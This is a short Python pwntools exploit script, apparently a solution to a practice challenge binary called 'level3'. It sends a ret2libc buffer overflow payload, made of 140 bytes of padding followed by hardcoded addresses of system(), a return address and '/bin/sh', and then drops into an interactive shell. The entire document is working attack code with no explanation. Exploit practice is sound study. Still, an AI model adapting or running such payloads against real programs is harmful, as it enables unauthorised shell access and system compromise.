#!/usr/bin/env python
from pwn import *
p = process('./level3')
ret = 0x08048460
system_addr=0xf7e3dda0
binsh_addr= 0xf7f5e9ab
payload =  'A'*140 + p32(system_addr) + p32(ret) + p32(binsh_addr)
p.send(payload)
p.interactive()


